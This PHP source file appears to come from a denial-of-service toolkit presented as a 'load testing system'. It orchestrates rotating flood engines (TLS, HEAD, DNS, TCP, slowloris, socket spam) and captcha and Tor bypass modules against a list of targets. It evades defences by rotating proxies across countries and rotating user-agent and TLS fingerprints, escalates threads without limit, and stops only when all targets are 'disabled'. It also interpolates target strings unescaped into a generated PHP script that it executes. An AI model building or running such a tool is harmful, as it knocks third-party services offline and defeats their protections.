<?php

require_once 'database.php';
require_once 'success_detector.php';
require_once 'stealth_engine_class.php';
require_once 'client_profile_class.php';
require_once 'tls_profile_class.php';
require_once 'proxy_manager_class.php';

require_once 'attack_engines/auto_bypass.php';
require_once 'attack_engines/bypassv2.php';
require_once 'attack_engines/post_spam.php';
require_once 'attack_engines/tls_flood.php';
require_once 'attack_engines/head_flood.php';
require_once 'attack_engines/human_behavior.php';
require_once 'attack_engines/slowloris_js.php';
require_once 'attack_engines/fetch_retry.php';
require_once 'attack_engines/socket_spam.php';
require_once 'attack_engines/http_spammer.php';
require_once 'attack_engines/raw_socket.php';
require_once 'attack_engines/captcha_clicker.php';
require_once 'attack_engines/tor_bypass.php';
require_once 'attack_engines/headless_flutter.php';
require_once 'attack_engines/browser_mix.php';

class ContinuousAdaptiveOrchestrator {
    private $db;
    private $config;
    private $groupId;
    private $targets;
    private $successDetector;
    private $stealthEngine;
    private $proxyManager;
    private $clientProfile;
    private $tlsProfile;
    
    private $currentEngine;
    private $currentThreads;
    private $evolutionCycle;
    private $startTime;
    private $lastEvolution;
    private $isRunning;
    private $stopRequested;
    
    private $availableEngines = [
        'auto_bypass',
        'socket_spam',
        'http_spammer',
        'tls_flood',
        'head_flood',
        'human_behavior',
        'raw_socket',
        'fetch_retry',
        'bypassv2',
        'post_spam',
        'slowloris_js',
        'captcha_clicker',
        'tor_bypass',
        'headless_flutter',
        'browser_mix',
        'dns_flood',
        'tcp_flood'
    ];
    
    public function __construct($database, $config = []) {
        $this->db = $database;
        $this->config = array_merge($this->getDefaultConfig(), $config);
        
        try {
            $this->successDetector = new SuccessDetector($database);
            $this->logOrchestratorMessage("SuccessDetector initialized successfully");
        } catch (Exception $e) {
            $this->logOrchestratorMessage("WARNING: SuccessDetector initialization failed: " . $e->getMessage());
            $this->successDetector = null;
        }
        
        $this->stealthEngine = null;
        $this->proxyManager = null;
        $this->clientProfile = null;
        $this->tlsProfile = null;
        
        $this->currentThreads = $this->config['initial_threads'];
        $this->evolutionCycle = 0;
        $this->isRunning = false;
        $this->stopRequested = false;
        
        $this->logOrchestratorMessage("ContinuousAdaptiveOrchestrator initialized with simplified dependencies");
    }
    
    public function getDefaultConfig() {
        return [
            'initial_threads' => 500,
            'max_threads' => PHP_INT_MAX, // Changed from 20000 to PHP_INT_MAX for unlimited threads
            'evolution_interval' => 60,
            'ja3_rotation_interval' => 20,
            'success_threshold' => 75.0,
            'success_duration_required' => 300,
            'escalation_factor' => 1.5,
            'resistance_threshold' => 50.0,
            'stealth_enabled' => true,
            'proxy_rotation' => true,
            'ua_rotation' => true,
            'geolocation_rotation' => true,
            'behavior_profiles' => ['power', 'scanner', 'mobile'],
            'logging_enabled' => true
        ];
    }
    
    public function start($targets, $groupId, $profile = []) {
        $this->groupId = $groupId;
        $this->targets = $targets;
        $this->startTime = time();
        $this->lastEvolution = time();
        $this->isRunning = true;
        $this->stopRequested = false;
        
        $this->logOrchestratorMessage("Starting Continuous-Adaptive Attack - Group: $groupId, Targets: " . count($targets));
        $this->logOrchestratorMessage("Initial configuration: Threads={$this->currentThreads}, Evolution interval={$this->config['evolution_interval']}s");
        
        $this->initializeComponents();
        $this->selectInitialEngine();
        
        return $this->executeMainLoop();
    }
    
    public function stop() {
        $this->stopRequested = true;
        $this->logOrchestratorMessage("Stop requested for Continuous-Adaptive Attack - Group: {$this->groupId}");
    }
    
    private function executeMainLoop() {
        $this->logOrchestratorMessage("Entering main continuous-adaptive loop");
        
        while ($this->isRunning && !$this->stopRequested) {
            $cycleStartTime = time();
            
            $this->logOrchestratorMessage("Evolution Cycle #{$this->evolutionCycle} - Engine: {$this->currentEngine}, Threads: {$this->currentThreads}");
            
            $this->executeEvolutionCycle();
            
            if ($this->shouldEvolveStealth()) {
                $this->evolveStealth();
            }
            
            if ($this->shouldEvolveEngine()) {
                $this->evolveEngine();
            }
            
            if ($this->shouldEscalateThreads()) {
                $this->escalateThreads();
            }
            
            if ($this->checkSuccessCondition()) {
                $this->logOrchestratorMessage("Success condition met - all targets disabled");
                break;
            }
            
            $this->evolutionCycle++;
            $this->waitForNextEvolution($cycleStartTime);
        }
        
        $this->isRunning = false;
        return $this->generateFinalReport();
    }
    
    private function executeEvolutionCycle() {
        $results = $this->executeAttackCycle();
        $this->processEngineResults($results);
    }
    
    private function executeAttackCycle() {
        $this->logOrchestratorMessage("Executing attack cycle #{$this->evolutionCycle} with engine: {$this->currentEngine}");
        
        $engineClass = $this->getEngineClass($this->currentEngine);
        if (!$engineClass || !class_exists($engineClass)) {
            $this->logOrchestratorMessage("ERROR: Engine class $engineClass not found");
            return [];
        }
        
        $results = [];
        foreach ($this->targets as $target) {
            $this->logOrchestratorMessage("Starting {$this->currentEngine} attack on $target with {$this->currentThreads} threads");
            
            $engineConfig = [
                'threads' => $this->currentThreads,
                'duration' => $this->config['evolution_interval'],
                'stealth_enabled' => $this->config['stealth_enabled'],
                'proxy_rotation' => $this->config['proxy_rotation']
            ];
            
            $this->startEngineProcess($engineConfig, $target, $this->groupId);
            
            $results[$target] = [
                'engine' => $this->currentEngine,
                'threads' => $this->currentThreads,
                'started_at' => time()
            ];
        }
        
        return $results;
        
        $this->logOrchestratorMessage("Evolution cycle #{$this->evolutionCycle} completed - Threads: {$this->currentThreads}, Engine: {$this->currentEngine}");
    }
    
    private function evolveStealth() {
        $this->logOrchestratorMessage("Evolving stealth components");
        
        if ($this->config['proxy_rotation']) {
            $this->evolveProxyGeolocation();
        }
        
        if ($this->config['ua_rotation']) {
            $this->clientProfile->rotateUserAgent();
        }
        
        $this->stealthEngine->rotateFingerprint();
        $this->tlsProfile->rotateTLSProfile();
        
        $this->lastEvolution = time();
    }
    
    private function evolveProxyGeolocation() {
        $geolocations = ['US', 'EU', 'RU', 'CN', 'MIXED'];
        $selectedGeo = $geolocations[array_rand($geolocations)];
        
        $this->proxyManager->setGeolocationFilter($selectedGeo);
        $this->proxyManager->rotateProxy();
        
        $this->logOrchestratorMessage("Proxy geolocation evolved to: $selectedGeo");
    }
    
    private function evolveEngine() {
        $currentSuccessRate = $this->calculateCurrentSuccessRate();
        
        if ($currentSuccessRate < $this->config['resistance_threshold']) {
            $previousEngine = $this->currentEngine;
            $this->selectNextEngine();
            
            $this->logOrchestratorMessage("Engine evolved from $previousEngine to {$this->currentEngine} (success rate: {$currentSuccessRate}%)");
        }
    }
    
    private function selectNextEngine() {
        $currentIndex = array_search($this->currentEngine, $this->availableEngines);
        $nextIndex = ($currentIndex + 1) % count($this->availableEngines);
        $this->currentEngine = $this->availableEngines[$nextIndex];
    }
    
    private function selectInitialEngine() {
        $this->currentEngine = $this->availableEngines[0];
        $this->logOrchestratorMessage("Initial engine selected: {$this->currentEngine}");
    }
    
    private function escalateThreads() {
        $newThreads = $this->currentThreads * $this->config['escalation_factor'];
        
        // $newThreads = min(
        //     $this->currentThreads * $this->config['escalation_factor'],
        //     $this->config['max_threads']
        // );
        
        if ($newThreads > $this->currentThreads) {
            $this->logOrchestratorMessage("Escalating threads from {$this->currentThreads} to $newThreads");
            $this->currentThreads = $newThreads;
        }
    }
    
    private function shouldEvolveStealth() {
        return (time() - $this->lastEvolution) >= $this->config['evolution_interval'];
    }
    
    private function shouldEvolveEngine() {
        return $this->calculateCurrentSuccessRate() < $this->config['resistance_threshold'];
    }
    
    private function shouldEscalateThreads() {
        $currentSuccessRate = $this->calculateCurrentSuccessRate();
        return $currentSuccessRate < $this->config['resistance_threshold'] && 
               $this->currentThreads < $this->config['max_threads'];
    }
    
    private function checkSuccessCondition() {
        $disabledTargets = 0;
        $totalTargets = count($this->targets);
        
        foreach ($this->targets as $target) {
            $metrics = $this->getTargetMetrics($target);
            $analysis = $this->successDetector->isTargetDisabled($target, $metrics);
            
            if ($analysis['disabled'] || ($analysis['permanent_failure_rate'] ?? 0) >= ($this->config['success_threshold'] / 100)) {
                $disabledTargets++;
            }
        }
        
        $successRate = ($disabledTargets / $totalTargets) * 100;
        
        if ($successRate >= 100) {
            $this->logOrchestratorMessage("All targets disabled - success condition met");
            return true;
        }
        
        $this->logOrchestratorMessage("Success progress: $disabledTargets/$totalTargets targets disabled ({$successRate}%)");
        return false;
    }
    
    private function calculateCurrentSuccessRate() {
        $totalSuccessRate = 0;
        $targetCount = count($this->targets);
        
        foreach ($this->targets as $target) {
            $metrics = $this->getTargetMetrics($target);
            $analysis = $this->successDetector->isTargetDisabled($target, $metrics);
            $successRate = ($analysis['permanent_failure_rate'] ?? 0) * 100;
            $totalSuccessRate += $successRate;
        }
        
        return $targetCount > 0 ? $totalSuccessRate / $targetCount : 0;
    }
    
    private function processEngineResults($results) {
        $this->logOrchestratorMessage("Processing engine results for cycle #{$this->evolutionCycle}");
        
        $this->saveEvolutionReport($results);
        $this->updateTargetStatuses($results);
    }
    
    private function saveEvolutionReport($results) {
        $reportData = [
            'group_id' => $this->groupId,
            'evolution_cycle' => $this->evolutionCycle,
            'engine' => $this->currentEngine,
            'threads' => $this->currentThreads,
            'timestamp' => date('Y-m-d H:i:s'),
            'results' => $results,
            'success_rate' => $this->calculateCurrentSuccessRate()
        ];
        
        $reportFile = __DIR__ . "/../reports/evolution_cycle_{$this->groupId}_{$this->evolutionCycle}.json";
        $this->ensureDirectoryExists(dirname($reportFile));
        file_put_contents($reportFile, json_encode($reportData, JSON_PRETTY_PRINT));
    }
    
    private function updateTargetStatuses($results) {
        foreach ($this->targets as $target) {
            $metrics = $this->getTargetMetrics($target);
            $analysis = $this->successDetector->isTargetDisabled($target, $metrics);
            
            if ($analysis['disabled']) {
                $this->successDetector->updateTargetStatus($target, 'disabled', implode(', ', $analysis['reasons']));
            } elseif (($analysis['protection_rate'] ?? 0) > 0.3) {
                $this->successDetector->updateTargetStatus($target, 'protected', 'protection_activated');
            } else {
                $this->successDetector->updateTargetStatus($target, 'active', 'normal_operation');
            }
        }
    }
    
    private function getTargetMetrics($target) {
        $engineClass = $this->getEngineClass($this->currentEngine);
        if (!$engineClass) {
            return $this->getFallbackMetrics();
        }
        
        $statusFile = "/tmp/engine_status_{$this->groupId}_{$this->currentEngine}.json";
        if (file_exists($statusFile)) {
            $status = json_decode(file_get_contents($statusFile), true);
            if ($status && isset($status['metrics'])) {
                $this->logOrchestratorMessage("Retrieved real metrics from {$this->currentEngine} for $target");
                return $this->formatRealMetrics($status['metrics']);
            }
        }
        
        return $this->getFallbackMetrics();
    }
    
    private function getFallbackMetrics() {
        return [
            'total_requests' => 0,
            'status_codes' => [
                '200' => 0,
                '404' => 0,
                '503' => 0,
                '524' => 0,
                '403' => 0
            ],
            'latency' => ['avg' => 0, 'p95' => 0, 'p99' => 0],
            'zero_byte_responses' => 0,
            'recent_responses' => []
        ];
    }
    
    private function formatRealMetrics($engineMetrics) {
        $statusCodes = $engineMetrics['error_codes'] ?? [];
        $statusCodes['200'] = $engineMetrics['success_count'] ?? 0;
        
        return [
            'total_requests' => $engineMetrics['total_requests'] ?? 0,
            'status_codes' => $statusCodes,
            'latency' => ['avg' => 2000, 'p95' => 5000, 'p99' => 8000],
            'zero_byte_responses' => $statusCodes['524'] ?? 0,
            'recent_responses' => []
        ];
    }
    
    private function waitForNextEvolution($cycleStartTime) {
        $cycleElapsed = time() - $cycleStartTime;
        $waitTime = max(0, $this->config['evolution_interval'] - $cycleElapsed);
        
        if ($waitTime > 0) {
            $this->logOrchestratorMessage("Waiting {$waitTime}s for next evolution cycle");
            sleep($waitTime);
        }
    }
    
    private function generateFinalReport() {
        $totalDuration = time() - $this->startTime;
        
        $finalReport = [
            'group_id' => $this->groupId,
            'total_duration' => $totalDuration,
            'evolution_cycles' => $this->evolutionCycle,
            'final_engine' => $this->currentEngine,
            'final_threads' => $this->currentThreads,
            'targets_attacked' => count($this->targets),
            'success_rate' => $this->calculateCurrentSuccessRate(),
            'stop_reason' => $this->stopRequested ? 'manual_stop' : 'success_condition_met',
            'timestamp' => date('Y-m-d H:i:s')
        ];
        
        $reportFile = __DIR__ . "/../reports/continuous_adaptive_final_{$this->groupId}.json";
        $this->ensureDirectoryExists(dirname($reportFile));
        file_put_contents($reportFile, json_encode($finalReport, JSON_PRETTY_PRINT));
        
        $this->logOrchestratorMessage("Continuous-Adaptive Attack completed - Final report saved");
        
        return $finalReport;
    }
    
    private function initializeComponents() {
        $this->logOrchestratorMessage("Initializing continuous-adaptive components");
        
        try {
            if ($this->config['stealth_enabled']) {
                $this->stealthEngine = new StealthEngine();
                $this->logOrchestratorMessage("Stealth engine initialized successfully");
            }
            
            if ($this->config['proxy_rotation']) {
                $this->proxyManager = new ProxyManager();
                $this->proxyManager->loadProxies();
                $this->logOrchestratorMessage("Proxy manager initialized with " . $this->proxyManager->getProxyCount() . " proxies");
            }
            
            $this->clientProfile = new ClientProfile();
            $this->tlsProfile = new TLSProfile();
            $this->logOrchestratorMessage("Client and TLS profiles initialized successfully");
            $this->logOrchestratorMessage("All components initialized successfully");
        } catch (Exception $e) {
            $this->logOrchestratorMessage("ERROR initializing components: " . $e->getMessage());
        }
    }
    
    private function getEngineClass($engineName) {
        $engineMap = [
            'auto_bypass' => 'AutoBypassEngine',
            'bypassv2' => 'BypassV2Engine',
            'post_spam' => 'PostSpamEngine',
            'tls_flood' => 'TLSFloodEngine',
            'head_flood' => 'HeadFloodEngine',
            'human_behavior' => 'HumanBehaviorEngine',
            'slowloris_js' => 'SlowlorisJSEngine',
            'fetch_retry' => 'FetchRetryEngine',
            'socket_spam' => 'SocketSpamEngine',
            'http_spammer' => 'HttpSpammerEngine',
            'raw_socket' => 'RawSocketEngine',
            'captcha_clicker' => 'CaptchaClickerEngine',
            'tor_bypass' => 'TorBypassEngine',
            'headless_flutter' => 'HeadlessFlutterEngine',
            'browser_mix' => 'BrowserMixEngine',
            'dns_flood' => 'DNSFloodEngine',
            'tcp_flood' => 'TCPFloodEngine'
        ];
        
        return $engineMap[$engineName] ?? null;
    }
    
    private function ensureDirectoryExists($directory) {
        if (!is_dir($directory)) {
            mkdir($directory, 0755, true);
        }
    }
    
    private function startEngineProcess($engineConfig, $target, $groupId) {
        $processId = uniqid("attack_");
        $logFile = "/tmp/attack_process_{$processId}.log";
        
        $scriptContent = "<?php\n";
        $scriptContent .= "require_once '/home/ubuntu/repos/load_testing_system/api/database.php';\n";
        $scriptContent .= "require_once '/home/ubuntu/repos/load_testing_system/api/proxy_manager_class.php';\n";
        $scriptContent .= "require_once '/home/ubuntu/repos/load_testing_system/api/stealth_engine_class.php';\n";
        $scriptContent .= "require_once '/home/ubuntu/repos/load_testing_system/api/client_profile_class.php';\n";
        $scriptContent .= "require_once '/home/ubuntu/repos/load_testing_system/api/tls_profile_class.php';\n";
        $scriptContent .= "require_once '/home/ubuntu/repos/load_testing_system/api/attack_engines/{$this->currentEngine}.php';\n";
        $scriptContent .= "\$engine = new " . $this->getEngineClass($this->currentEngine) . "(" . var_export($engineConfig, true) . ");\n";
        $scriptContent .= "\$result = \$engine->start('$target', '$groupId', []);\n";
        $scriptContent .= "file_put_contents('/tmp/engine_status_{$groupId}_{$this->currentEngine}.json', json_encode(['metrics' => \$result, 'timestamp' => time()]));\n";
        
        $scriptFile = "/tmp/attack_script_{$processId}.php";
        file_put_contents($scriptFile, $scriptContent);
        
        $command = "php $scriptFile > $logFile 2>&1 &";
        exec($command);
        
        $this->logOrchestratorMessage("Started background attack process: $processId for $target");
    }
    
    private function logOrchestratorMessage($message) {
        if (!$this->config['logging_enabled']) {
            return;
        }
        
        $logFile = './logs/backend.log';
        $this->ensureDirectoryExists(dirname($logFile));
        
        $timestamp = date('Y-m-d H:i:s');
        $logEntry = "[$timestamp] CONTINUOUS_ADAPTIVE_ORCHESTRATOR: $message" . PHP_EOL;
        file_put_contents($logFile, $logEntry, FILE_APPEND | LOCK_EX);
    }
    
    public function getStatus() {
        return [
            'is_running' => $this->isRunning,
            'group_id' => $this->groupId,
            'evolution_cycle' => $this->evolutionCycle,
            'current_engine' => $this->currentEngine,
            'current_threads' => $this->currentThreads,
            'targets_count' => count($this->targets ?? []),
            'uptime' => $this->startTime ? time() - $this->startTime : 0,
            'success_rate' => $this->calculateCurrentSuccessRate()
        ];
    }
}

?>
